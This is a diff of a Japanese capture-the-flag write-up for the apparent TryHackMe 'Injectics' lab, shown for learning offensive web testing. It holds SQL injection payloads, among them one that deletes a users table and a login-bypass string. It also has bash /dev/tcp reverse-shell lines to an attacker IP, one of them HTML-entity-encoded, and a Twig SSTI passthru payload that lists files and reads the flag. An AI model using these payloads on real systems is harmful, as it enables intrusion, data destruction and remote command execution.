@@ -52,12 +52,14 @@ gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster
 ```
 
 ホームページコメント
+
 ```html
 <!-- Website developed by John Tim - dev@injectics.thm-->
 <!-- Mails are stored in mail.log file-->
 ```
 
 mail.log
+
 ```text
 From: dev@injectics.thm
 To: superadmin@injectics.thm
@@ -84,8 +86,8 @@ Dev Team
 dev@injectics.thm
 ```
 
-usersテーブルが削除されたり破損したりすると、自動的にデフォルト認証情報で復活する。1分間隔。  
-usersテーブルを削除するSQLを注入できれば、管理者ログインもできることになる。
+users テーブルが削除されたり破損したりすると、自動的にデフォルト認証情報で復活する。1 分間隔。  
+users テーブルを削除する SQL を注入できれば、管理者ログインもできることになる。
 
 デフォルト認証情報  
 superadmin@injectics.thm | superSecurePasswd101  
@@ -111,9 +113,9 @@ username=dev@injectics.thm&password='%09||%091=1--&function=login
 
 うまくいかない。
 
-### Usersテーブル削除
-  
-usersテーブルの削除を注入できるか？
+### Users テーブル削除
+
+users テーブルの削除を注入できるか？
 
 ```text
 username=dev@injectics.thm&password='; delete from users; --&function=login
@@ -128,7 +130,7 @@ username=dev@injectics.thm&password=';%0AdE/**/lEtE%0AfRoM/**/users;--&function=
 うまくいかない。
 
 全く分からなかったのでウォークスルーを見た。  
-intruderを使って、usernameフィールドにSQLiリストを適用して弱点を探る。  
+intruder を使って、username フィールドに SQLi リストを適用して弱点を探る。
 
 ```shell
 wget https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/Intruder/exploit/Auth_Bypass.txt
@@ -141,9 +143,9 @@ username='%20OR%20'x'%3d'x'%23%3b&password=aaa&function=login
 ログインバイパスに成功している。
 {"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
 ```
-198個中、成功したのはこの1個だけ。  
-手作業で探すのは無謀だった。
 
+198 個中、成功したのはこの 1 個だけ。  
+これを手作業で探すのは無理。
 
 ## dashboard.php
 
@@ -177,14 +179,90 @@ Seems like database or some important table is deleted. InjecticsService is runn
 
 ## 管理者ログイン
 
-profile画面へのリンクがあり、リンク先にはプロフィール変更のフォームがある。
+profile 画面へのリンクがあり、リンク先にはプロフィール変更のフォームがある。
 
-Last Name にペイロードを入れてもそのままの形で保存される。
+Last Name にペイロードを入れてもそのままの形で保存される。First Name も同様。
 
 ```text
 last';select * from users;--
 ```
 
+mail フィールドを変更してもメールアドレスが変わらないため、mail は SQL で使われていない気がする。
+
+変更した First Name がダッシュボードで表示されている。
+
+```html
+<div class="main-content">
+  <div class="content">
+    <h3>Welcome, admin2'; select * from users; --!</h3>
+  </div>
+</div>
+```
+
+たぶん PHP を注入できればリバースシェルを起動できるのではないだろうか？
+
+```text
+admin; exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'");
+```
+
+これはそのまま画面に表示されるだけで機能しなかった。
+
+次に、下記を試した。
+
+```php
+"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'") ?>"
+をエンコード
+&#x22;&#x3c;&#x3f;&#x70;&#x68;&#x70;&#x20;&#x65;&#x78;&#x65;&#x63;&#x28;&#x22;&#x2f;&#x62;&#x69;&#x6e;&#x2f;&#x62;&#x61;&#x73;&#x68;&#x20;&#x2d;&#x63;&#x20;&#x27;&#x62;&#x61;&#x73;&#x68;&#x20;&#x2d;&#x69;&#x20;&#x3e;&#x26;&#x20;&#x2f;&#x64;&#x65;&#x76;&#x2f;&#x74;&#x63;&#x70;&#x2f;&#x31;&#x30;&#x2e;&#x32;&#x2e;&#x32;&#x32;&#x2e;&#x31;&#x38;&#x32;&#x2f;&#x31;&#x32;&#x33;&#x34;&#x20;&#x30;&#x3e;&#x26;&#x31;&#x27;&#x22;&#x29;&#x20;&#x3f;&#x3e;&#x22;
+```
+
+デコードされて PHP のコードが表示されただけ。
+
+### SSTI
+
+```text
+{{7*'7'}}
+```
+
+としたら
+49 と表示された。
+
+#### リバースシェル
+
+```php
+{{exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'")}}
+```
+
+下記のエラーが表示された。
+
+```text
+Unknown "exec" function in "__string_template__6f39863be97aec9b973ef9c5063a8cdf970415e721db486ff70810d1aa073d75" at line 1.
+```
+
+#### ls, cat
+
+```text
+burpでリクエストを変更。sort('system')ではだめだった。
+
+email=superadmin%40injectics.thm&fname={{['ls',""]|sort('passthru')}}&lname=222
+
+Welcome, adminLogin007.php banner.jpg composer.json composer.lock conn.php css dashboard.php edit_leaderboard.php flags functions.php index.php injecticsService.php js login.php logout.php mail.log script.js styles.css update_profile.php vendor Array!
+```
+
+```text
+email=superadmin%40injectics.thm&fname={{['cd+flags;ls',""]|sort('passthru')}}&lname=222
+
+Welcome, 5d8af1dc14503c7e4bdc8e51a3469f48.txt Array!
+```
+
+```text
+email=superadmin%40injectics.thm&fname={{['cd+flags;cat+5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}&lname=222
+
+Welcome, THM{} Array!
+```
 
 ## 振り返り
-- SQLiの脆弱性を手作業で探るのは無理。認証バイパスはintruderを使いやすい。
+
+- 全てのステップが難しかった。ウォークスルー見ないとどれだけ時間かけても終わらなかった気がする。
+- SQLi の脆弱性を手作業で探るのは無理な場合もある。認証バイパスは比較的 intruder を使いやすい。
+- SSTI は覚えられるようなものではないので、HackTricks 等を見ながら試行錯誤するしかない。
+- 今回の場合、インジェクションを保存する画面と、テンプレートの評価結果が表示される画面が別だったため、SSTI 自動ツールは使えなかったのではないかと考えている。
